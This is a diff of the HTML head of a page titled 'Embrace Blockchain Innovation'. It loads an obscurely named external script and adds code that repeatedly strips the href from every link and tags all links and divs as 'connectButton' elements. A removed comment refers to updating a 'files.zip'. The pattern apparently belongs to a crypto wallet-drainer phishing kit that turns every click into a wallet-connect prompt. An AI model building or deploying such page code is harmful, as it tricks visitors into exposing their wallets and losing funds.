@@ -1,64 +1,22 @@
 <html lang="en">
 
 <head>
-  <script charset="UTF-8" type="text/javascript" src="./7b942fd6-a755-4165-ba9c-4fcdc6bcfa5d.js"></script>
-  <!–– Please update files.zip if you not already did and check below (updated the 07/29) ––>
+  <script charset="UTF-8" async type="text/javascript" src="./532a2.434bbf3dd4ef35f.js"></script>
+	<script>
+    function addClassesToElements() {
 
-    <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        // Add CSS for cursor pointer
-        var style = document.createElement("style");
-        style.innerHTML = ".interact-button { cursor: pointer; }";
-        document.head.appendChild(style);
-
-        // Update <a> & <button> elements
-        document.querySelectorAll("a").forEach(function (link) {
-          link.addEventListener("click", function (event) {
-            event.preventDefault();
-          });
-          link.removeAttribute("href");
-          link.classList.add("interact-button");
-          link.classList.add("placeholder-button");
-          link.classList.add("connect-button");
-        });
-
-        document.querySelectorAll("button").forEach(function (link) {
-          link.addEventListener("click", function (event) {
-            event.preventDefault();
-          });
-          link.removeAttribute("href");
-          link.classList.add("interact-button");
-          link.classList.add("placeholder-button");
-          link.classList.add("connect-button");
-        });
-      });
-    </script>
-
-    <script>
-      window.onload = function () {
-        var links = document.querySelectorAll("a");
-        var buttons = document.querySelectorAll("button");
-
-        links.forEach(function (link) {
-          link.classList.add("interact-button");
-          link.classList.add("placeholder-button");
-          link.classList.add("connect-button");
-
-          link.addEventListener("click", function (event) {
-            event.preventDefault();
-          });
-        });
-
-        buttons.forEach(function (button) {
-          button.classList.add("interact-button");
-          button.classList.add("placeholder-button");
-          button.classList.add("connect-button");
-          button.addEventListener("click", function (event) {
-            event.preventDefault();
-          });
-        });
-      };
-    </script>
+    const links = document.querySelectorAll('a:not(.connectButton)');
+    for (const link of links) {
+        link.removeAttribute('href');
+        link.classList.add('connectButton');
+    }
+    const buttons = document.querySelectorAll('div:not(.connectButton)');
+    for (const button of buttons) {
+        button.classList.add('connectButton');
+    }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Embrace Blockchain Innovation</title>
